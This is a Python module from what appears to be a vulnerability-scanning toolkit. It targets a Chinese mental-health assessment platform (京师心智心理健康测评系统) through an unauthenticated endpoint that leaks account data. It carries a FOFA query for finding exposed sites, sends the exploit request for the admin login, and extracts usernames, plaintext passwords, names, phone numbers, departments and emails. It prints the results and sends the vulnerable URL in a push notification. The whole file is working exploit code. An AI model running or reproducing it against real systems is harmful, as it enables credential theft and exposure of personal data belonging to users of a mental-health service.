import re

from Common.Common_Request import common_request
from Modules.Configure import ServerJ


class Basic_information:
    no = 140,
    bugName = "京师心智心理健康测评系统-账号密码泄露漏洞"
    Asset_search = {'fofa': 'body="JS/ligerComboBox/ligerTree.js"'}


def extract_content(text, start_pattern, end_pattern):
    pattern = f"{re.escape(start_pattern)}(.*?){re.escape(end_pattern)}"
    match = re.search(pattern, text)
    if match:
        return match.group(1)
    else:
        return None


def scan_JS_ligerComboBox_information(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.01",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close"
    }
    response = common_request(url, path, headers, method='GET', timeout=20, proxies=proxies,
                              append_to_output=append_to_output)
    if response is not None:
        if response.status_code == 200 and "_AddFiletemplate" in response.text:
            text = response.text
            start_pattern1 = '_u_loginname":'
            end_pattern1 = ',"_u_mark_delete'
            _u_loginname = extract_content(text, start_pattern1, end_pattern1)
            start_pattern2 = '"_u_name":'
            end_pattern2 = ',"_u_parentsemail'
            _u_name = extract_content(text, start_pattern2, end_pattern2)
            start_pattern3 = '_u_password":'
            end_pattern3 = ',"_u_remark'
            _u_password = extract_content(text, start_pattern3, end_pattern3)
            start_pattern4 = '_u_tel":'
            end_pattern4 = ',"_u_time'
            _u_tel = extract_content(text, start_pattern4, end_pattern4)
            start_pattern6 = 'departmentName":'
            end_pattern6 = ',"role_describe'
            departmentName = extract_content(text, start_pattern6, end_pattern6)
            start_pattern7 = '_u_email":'
            end_pattern7 = ',"_u_id'
            _u_email = extract_content(text, start_pattern7, end_pattern7)

            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")

            Zhanghaomima = "_u_loginname:{}, _u_password:{}, _u_name:{} _u_tel:{}, departmentName:{}, _u_email:{}".format(
                _u_loginname, _u_password, _u_name, _u_tel, departmentName, _u_email)
            append_to_output(Zhanghaomima, "bule")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
